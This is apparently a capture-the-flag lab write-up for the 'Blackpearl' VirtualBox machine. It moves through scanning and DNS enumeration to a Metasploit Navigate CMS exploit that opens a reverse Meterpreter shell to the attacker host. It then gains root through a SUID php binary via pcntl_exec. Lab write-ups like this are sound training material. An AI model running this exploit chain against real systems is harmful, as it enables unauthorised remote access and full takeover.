# Blackpearl

IP Address: 10.0.2.154

```
└─$ nmap -sC -sV 10.0.2.154
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 16:22 EDT
Nmap scan report for 10.0.2.154 (10.0.2.154)
Host is up (0.00019s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:59:28:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds

```

Opened DNS protocol on port 53:

```
└─$ dnsrecon -r 127.0.0.0/24 -n 10.0.2.154 -d blah
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found
```

```
msf6 exploit(multi/http/navigate_cms_rce) > run
[*] Started reverse TCP handler on 10.0.2.26:4444 
[-] Exploit aborted due to failure: no-access: Login bypass failed
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/navigate_cms_rce) > run
[*] Started reverse TCP handler on 10.0.2.26:4444 
[+] Login bypass successful
[+] Upload successful
[*] Triggering payload...
[*] Sending stage (40004 bytes) to 10.0.2.154
[*] Meterpreter session 1 opened (10.0.2.26:4444 -> 10.0.2.154:51360) at 2025-09-20 16:59:25 -0400
```

www-data@blackpearl:/tmp$ find / -type f -perm -4000 2>/dev/null


```
www-data@blackpearl:/tmp$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.3
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
whoami
root
# 
```

Resource: https://medium.com/@anon_aninda/linux-privilege-escalation-by-using-suid-3f71d7c27c51